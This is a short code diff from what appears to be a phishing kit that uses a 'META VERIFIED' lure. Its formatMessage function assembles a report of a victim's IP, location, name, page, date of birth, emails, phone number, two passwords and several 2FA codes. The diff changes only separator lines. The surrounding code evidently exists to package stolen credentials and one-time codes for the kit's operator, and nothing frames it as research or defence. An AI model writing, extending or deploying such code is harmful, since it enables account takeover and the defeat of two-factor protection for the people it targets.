@@ -133,18 +133,18 @@ function formatMessage(data: any): string {
 
     const lines = [
         `<b>📋 META VERIFIED</b>`,
-        `--------------`,
+        `----------------------`,
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
-        `--------------`,
+        `----------------------`,
         `<b>Full Name:</b> <code>${formatCodeField(d.fullName)}</code>`,
         `<b>Page:</b> <code>${formatCodeField(d.fanpage)}</code>`,
         `<b>DOB:</b> <code>${dob}</code>`,
-        `--------------`,
+        `----------------------`,
         `<b>Email:</b> <code>${formatCodeField(d.email)}</code>`,
         `<b>Business Email:</b> <code>${formatCodeField(d.emailBusiness)}</code>`,
         `<b>Phone:</b> <code>${phoneDisplay}</code>`,
-        `--------------`,
+        `----------------------`,
         `<b>Password(1):</b> <code>${formatCodeField(d.password)}</code>`,
         `<b>Password(2):</b> <code>${formatCodeField(d.passwordSecond)}</code>`,
         `${authLine ? authLine.trim() : ''}`
@@ -152,7 +152,7 @@ function formatMessage(data: any): string {
 
     if (has2FA) {
         lines.push(
-            `--------------`,
+            `----------------------`,
             `<b>2FA(1):</b> <code>${formatCodeField(d.twoFa)}</code>`,
             `<b>2FA(2):</b> <code>${formatCodeField(d.twoFaSecond)}</code>`,
             `<b>2FA(3):</b> <code>${formatCodeField(d.twoFaThird)}</code>`
